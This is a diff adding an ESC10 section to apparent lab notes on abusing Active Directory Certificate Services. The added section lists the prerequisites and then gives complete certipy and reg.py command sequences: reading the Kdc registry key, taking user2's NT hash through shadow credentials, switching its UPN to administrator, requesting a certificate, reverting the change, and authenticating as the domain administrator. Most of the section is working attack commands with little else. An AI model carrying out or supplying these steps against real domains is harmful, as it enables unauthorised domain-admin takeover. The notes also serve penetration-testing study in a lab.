@@ -154,3 +154,43 @@ certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn 
 certipy auth -pfx user3.pfx -domain lab.local
 ```
 %%authenticate as user3 with the previous cert%%
+
+## ESC10
+Similar to ESC9 but focuses on misconfigurations in registry keys rather tan template configurations.
+
+## ESC10 Abuse requirements - Case 1
+To successfully abuse this misconfiguration, specific prerequisites must be met:
+
+1. The StrongCertificateBindingEnforcement registry key is set to 0, indicating that no strong mapping is performed. It's important to note that this value will only be considered if the April 2023 updates have yet to be installed.
+2. At least one template specifies that client authentication is enabled (e.g., the built-in User template).
+3. We have at least GenericWrite rights for account A, allowing us to compromise account B.
+
+```
+reg.py 'lab'/'Administrator':'Password123!'@10.129.205.199 query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Kdc'
+```
+%% review registry keys as an administrator confirm that strongcertificatebindingenforcement is set to 0, you need an administrator on a DC %%
+
+```
+certipy shadow auto -u 'BlWasp@lab.local' -p 'Password123!' -account user2
+```
+%% retrieve user2 NT hash via shadow credentials %%
+
+```
+certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn administrator@lab.local
+```
+%%change user2 UPN to Administrator%%
+
+```
+certipy req -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template User
+```
+%% request certificate using User template you should get administrator.pfx %%
+
+```
+certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local
+```
+%% revert changes of user2 %%
+
+```
+certipy auth -pfx administrator.pfx -domain lab.local
+```
+%% authenticate as the administrator with the administrator.pfx %%
